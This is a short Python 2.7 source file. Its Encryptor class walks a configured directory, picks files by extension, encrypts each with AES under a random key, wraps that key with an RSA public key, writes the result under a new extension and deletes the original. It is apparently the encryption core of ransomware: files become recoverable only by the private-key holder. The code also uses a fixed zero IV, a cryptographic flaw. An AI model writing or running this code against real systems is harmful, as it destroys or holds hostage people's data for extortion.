#TESTED ON PYTHON 2.7.17 WSL


import json
import os
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
import base64
from sys import platform


class Encryptor:
    files = []

    #For AES padding
    BS = 16
    def pad(self,s):
        return s + (self.BS - len(s) % self.BS) * chr(self.BS - len(s) % self.BS)

    def __init__(self,config_path):
        self.config_path = config_path
        self.__readConfig()

    def __readConfig(self):
        with open(self.config_path) as f:
            self.config = json.load(f)

    def __addSuitableFile(self):
        target_directory = self.config['target_directory'] or os.getcwd() 
        for(dirpath,dirnames,filenames) in os.walk(target_directory):
            for filename in filenames:
                if os.path.splitext(filename)[1] in self.config['target_extension']:
                    if platform == "linux" or platform =="linux2":
                        self.files.append(dirpath+'/'+filename)
                    else:
                            self.files.append(dirpath+'\\'+filename)
            if not self.config['iterate_folder']:
                break
    
    def __b64enc(self,param):
        return base64.b64encode(param)
    
    def __encryptPass(self,password,publickey):
        password = self.__b64enc(password)
        pub = open(publickey,"rb")
        publicKey = RSA.importKey(pub.read())
        cipher = Cipher_PKCS1_v1_5.new(publicKey)
        password = self.__b64enc(cipher.encrypt(password.encode()))
        return password

    def __encryptFile(self,file,pubkey):
        password = os.urandom(32)
        IV = 16 * '\x00'
        with open(file,"rb") as fIn:
            with open(file+self.config['extension'], "wb") as fOut:
                message = self.pad(fIn.read())
                aes = AES.new(password,AES.MODE_CBC,IV)
                password = self.__encryptPass(password,pubkey)
                fOut.write(password + ' ')
                # fOut.write(aes.encrypt(message))
                fOut.write(self.__b64enc(aes.encrypt(message)))
        os.remove(file)

    
    def encryptFiles(self,pubkey):
        self.__addSuitableFile()
        size = 0
        for file in self.files:
            size += os.path.getsize(file)
            self.__encryptFile(file,pubkey)
        return size
